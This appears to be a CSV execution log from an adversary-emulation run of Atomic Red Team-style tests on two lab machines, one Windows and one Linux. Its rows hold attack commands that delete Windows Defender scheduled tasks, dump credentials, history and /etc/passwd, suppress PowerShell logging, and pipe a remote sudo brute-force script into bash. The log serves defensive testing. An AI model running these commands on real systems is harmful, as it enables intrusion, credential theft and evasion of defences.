Time Ran,Ability Name,Agent,Host,pid,Link Command,Plaintext Command
2025-10-01T21:13:55Z,Delete Windows Defender Scheduled Tasks,maqmre,DESKTOP-B2K36HT,1772,IF EXIST "%temp%\Windows_Defender_Scheduled_Scan.xml" (     call ) ELSE (     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" > "%temp%\Windows_Defender_Scheduled_Scan.xml" &&     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" > "%temp%\Windows_Defender_Cleanup.xml" &&     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" > "%temp%\Windows_Defender_Verification.xml" &&     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" > "%temp%\Windows_Defender_Cache_Maintenance.xml" ) && (    IF EXIST "%temp%\Windows_Defender_Scheduled_Scan.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /f ) &&     IF EXIST "%temp%\Windows_Defender_Cleanup.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /f ) &&     IF EXIST "%temp%\Windows_Defender_Verification.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" /f ) &&     IF EXIST "%temp%\Windows_Defender_Cache_Maintenance.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /f )),IF EXIST "%temp%\Windows_Defender_Scheduled_Scan.xml" (     call ) ELSE (     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" > "%temp%\Windows_Defender_Scheduled_Scan.xml" &&     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" > "%temp%\Windows_Defender_Cleanup.xml" &&     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" > "%temp%\Windows_Defender_Verification.xml" &&     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" > "%temp%\Windows_Defender_Cache_Maintenance.xml" ) && (    IF EXIST "%temp%\Windows_Defender_Scheduled_Scan.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /f ) &&     IF EXIST "%temp%\Windows_Defender_Cleanup.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /f ) &&     IF EXIST "%temp%\Windows_Defender_Verification.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" /f ) &&     IF EXIST "%temp%\Windows_Defender_Cache_Maintenance.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /f ))
2025-10-01T21:13:55Z,Remote System Discovery - arp nix,bydmzm,onisa-VirtualBox,53618,if [ -x "$(command -v arp)" ]; then : ; else (which yum && yum -y install net-tools)||(which apt-get && apt-get install -y net-tools); fi; arp -a | grep -v '^?',if [ -x "$(command -v arp)" ]; then : ; else (which yum && yum -y install net-tools)||(which apt-get && apt-get install -y net-tools); fi; arp -a | grep -v '^?'
2025-10-01T21:13:55Z,Cached Credential Dump via Cmdkey,maqmre,DESKTOP-B2K36HT,7512,cmdkey /list,cmdkey /list
2025-10-01T21:13:55Z,WMI Reconnaissance List Remote Services,maqmre,DESKTOP-B2K36HT,3304,wmic /node:"127.0.0.1" service where (caption like "%Spooler%"),wmic /node:"127.0.0.1" service where (caption like "%Spooler%")
2025-10-01T21:13:55Z,Dump history,bydmzm,onisa-VirtualBox,53621,cat ~/.bash_history,cat ~/.bash_history
2025-10-01T21:13:55Z,Custom - Encoded PowerShell Test (110000),maqmre,DESKTOP-B2K36HT,3608,powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABlAGEAdABhACAAPQAgACIASABlAGwAbABvACAAVwBvAHIAbABkACEAIgA=,powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABlAGEAdABhACAAPQAgACIASABlAGwAbABvACAAVwBvAHIAbABkACEAIgA=
2025-10-01T21:13:55Z,Custom - Encoded PowerShell Test (110000),bydmzm,onisa-VirtualBox,53616,echo 'SGVsbG8gV29ybGQh' | base64 --decode >/tmp/decoded.txt,echo 'SGVsbG8gV29ybGQh' | base64 --decode >/tmp/decoded.txt
2025-10-01T21:13:55Z,Access /etc/passwd (Local),bydmzm,onisa-VirtualBox,53620,cat /etc/passwd > /tmp/T1003.008.txt; cat /tmp/T1003.008.txt,cat /etc/passwd > /tmp/T1003.008.txt; cat /tmp/T1003.008.txt
2025-10-01T21:13:55Z,emacs spawning an interactive system shell,bydmzm,onisa-VirtualBox,53625,sh -c "arp -a 2>/dev/null || arp 2>/dev/null",sh -c "arp -a 2>/dev/null || arp 2>/dev/null"
2025-10-01T21:14:04Z,Custom - Encoded PowerShell Test (110000),bydmzm,onisa-VirtualBox,53645,echo 'SGVsbG8gV29ybGQh' | base64 --decode >/tmp/decoded.txt,echo 'SGVsbG8gV29ybGQh' | base64 --decode >/tmp/decoded.txt
2025-10-01T21:14:04Z,Custom - Encoded PowerShell Test (110000),maqmre,DESKTOP-B2K36HT,4416,powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABlAGEAdABhACAAPQAgACIASABlAGwAbABvACAAVwBvAHIAbABkACEAIgA=,powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABlAGEAdABhACAAPQAgACIASABlAGwAbABvACAAVwBvAHIAbABkACEAIgA=
2025-10-01T21:14:06Z,Access /etc/passwd (Local),bydmzm,onisa-VirtualBox,53646,cat /etc/passwd > /tmp/T1003.008.txt; cat /tmp/T1003.008.txt,cat /etc/passwd > /tmp/T1003.008.txt; cat /tmp/T1003.008.txt
2025-10-01T21:14:06Z,Remote System Discovery - arp nix,bydmzm,onisa-VirtualBox,53651,if [ -x "$(command -v arp)" ]; then : ; else (which yum && yum -y install net-tools)||(which apt-get && apt-get install -y net-tools); fi; arp -a | grep -v '^?',if [ -x "$(command -v arp)" ]; then : ; else (which yum && yum -y install net-tools)||(which apt-get && apt-get install -y net-tools); fi; arp -a | grep -v '^?'
2025-10-01T21:14:06Z,WMI Reconnaissance List Remote Services,maqmre,DESKTOP-B2K36HT,7580,wmic /node:"127.0.0.1" service where (caption like "%Spooler%"),wmic /node:"127.0.0.1" service where (caption like "%Spooler%")
2025-10-01T21:14:06Z,emacs spawning an interactive system shell,bydmzm,onisa-VirtualBox,53636,sh -c "arp -a 2>/dev/null || arp 2>/dev/null",sh -c "arp -a 2>/dev/null || arp 2>/dev/null"
2025-10-01T21:14:07Z,Dump history,bydmzm,onisa-VirtualBox,53643,cat ~/.bash_history,cat ~/.bash_history
2025-10-01T21:14:07Z,Account Discovery (targeted),bydmzm,onisa-VirtualBox,53626,getent passwd | cut -d: -f1,getent passwd | cut -d: -f1
2025-10-01T21:14:07Z,iwr or Invoke Web-Request download,maqmre,DESKTOP-B2K36HT,1972,powershell.exe iwr -URI https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -Outfile %temp%\Atomic-license.txt,powershell.exe iwr -URI https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt -Outfile %temp%\Atomic-license.txt
2025-10-01T21:14:10Z,Cached Credential Dump via Cmdkey,maqmre,DESKTOP-B2K36HT,9868,cmdkey /list,cmdkey /list
2025-10-01T21:14:10Z,Delete Windows Defender Scheduled Tasks,maqmre,DESKTOP-B2K36HT,10156,IF EXIST "%temp%\Windows_Defender_Scheduled_Scan.xml" (     call ) ELSE (     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" > "%temp%\Windows_Defender_Scheduled_Scan.xml" &&     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" > "%temp%\Windows_Defender_Cleanup.xml" &&     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" > "%temp%\Windows_Defender_Verification.xml" &&     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" > "%temp%\Windows_Defender_Cache_Maintenance.xml" ) && (    IF EXIST "%temp%\Windows_Defender_Scheduled_Scan.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /f ) &&     IF EXIST "%temp%\Windows_Defender_Cleanup.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /f ) &&     IF EXIST "%temp%\Windows_Defender_Verification.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" /f ) &&     IF EXIST "%temp%\Windows_Defender_Cache_Maintenance.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /f )),IF EXIST "%temp%\Windows_Defender_Scheduled_Scan.xml" (     call ) ELSE (     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" > "%temp%\Windows_Defender_Scheduled_Scan.xml" &&     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" > "%temp%\Windows_Defender_Cleanup.xml" &&     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" > "%temp%\Windows_Defender_Verification.xml" &&     schtasks /query /xml /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" > "%temp%\Windows_Defender_Cache_Maintenance.xml" ) && (    IF EXIST "%temp%\Windows_Defender_Scheduled_Scan.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /f ) &&     IF EXIST "%temp%\Windows_Defender_Cleanup.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /f ) &&     IF EXIST "%temp%\Windows_Defender_Verification.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Verification" /f ) &&     IF EXIST "%temp%\Windows_Defender_Cache_Maintenance.xml" ( schtasks /delete /tn "\Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /f ))
2025-10-01T21:14:12Z,SUDO Brute Force - Debian,bydmzm,onisa-VirtualBox,53629,useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art; su -c "cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh | bash" art,useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art; su -c "cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh | bash" art
2025-10-01T21:14:12Z,Prevent Powershell History Logging,maqmre,DESKTOP-B2K36HT,6128,Set-PSReadlineOption -HistorySaveStyle SaveNothing,Set-PSReadlineOption -HistorySaveStyle SaveNothing
2025-10-01T21:14:15Z,SUDO Brute Force - Debian,bydmzm,onisa-VirtualBox,53617,useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art; su -c "cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh | bash" art,useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art; su -c "cd /tmp; curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1110.001/src/sudo_bruteforce.sh | bash" art
